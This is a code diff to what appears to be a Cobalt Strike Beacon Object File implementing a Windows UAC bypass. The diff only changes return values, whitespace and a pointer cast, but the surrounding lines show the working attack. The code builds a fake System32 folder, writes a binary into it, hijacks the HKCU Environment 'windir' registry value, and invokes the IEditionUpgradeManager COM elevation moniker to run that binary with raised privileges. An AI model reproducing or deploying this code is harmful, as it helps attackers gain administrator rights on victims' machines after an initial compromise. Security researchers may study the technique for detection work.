@@ -185,7 +185,7 @@ int go(char * args, unsigned long length) {
     BOOL test = KERNEL32$CreateDirectoryA(tempSystem32, NULL);
     if (test == 0 && KERNEL32$GetLastError() != 183) {
         BeaconPrintf(CALLBACK_ERROR, "Error creating new System32 directory\n");
-        return;
+        return 1;
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "Successfully created new System32 directory\n");
     }
@@ -204,22 +204,22 @@ int go(char * args, unsigned long length) {
     DWORD dwBytesWritten = 0;
     BOOL bErrorFlag = FALSE;
     hFile = KERNEL32$CreateFileA(targetBinLocation, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) 
-    { 
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
         BeaconPrintf(CALLBACK_OUTPUT, "Unable to open file \"%s\" for write.\n", targetBinLocation);
-        return;
+        return 1;
     }
     bErrorFlag = KERNEL32$WriteFile(hFile, DataBuffer, dwBytesToWrite, &dwBytesWritten, NULL);
     if (FALSE == bErrorFlag)
     {
         BeaconPrintf(CALLBACK_OUTPUT, "Unable to write to file.\n");
-        return;
+        return 1;
     }
     else {
         if (dwBytesWritten != dwBytesToWrite)
         {
             BeaconPrintf(CALLBACK_OUTPUT, "Error: dwBytesWritten != dwBytesToWrite\n");
-            return;
+            return 1;
         }
         else
         {
@@ -236,7 +236,7 @@ int go(char * args, unsigned long length) {
     LSTATUS regStatus = ADVAPI32$RegSetValueExA(windirKey, "windir", 0, REG_SZ, tempPath, MSVCRT$strlen(tempPath));
     if (regStatus != 0) {
         BeaconPrintf(CALLBACK_ERROR, "Error setting windir registry key!: %d\n", regStatus);
-        return;
+        return 1;
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "Successfully modified HKCU:Environment\\windir registry key!\n");
     }
@@ -284,7 +284,7 @@ int go(char * args, unsigned long length) {
             bop.cbStruct = sizeof(bop);
             bop.dwClassContext = CLSCTX_LOCAL_SERVER;
 
-            hr = OLE32$CoGetObject(szBuffer, (BIND_OPTS *)&bop, &IID_IEditionUpgradeManager, &Manager);
+            hr = OLE32$CoGetObject(szBuffer, (BIND_OPTS *)&bop, &IID_IEditionUpgradeManager, (void**)&Manager);
 
             if (SUCCEEDED(hr)) {
                 Data[0] = 2;
@@ -333,6 +333,6 @@ int go(char * args, unsigned long length) {
         BeaconPrintf(CALLBACK_ERROR, "Failed to delete folder %s: %d\n", tempSystem32, KERNEL32$GetLastError());
     }
 
-    return;
+    return 0;
 
 }
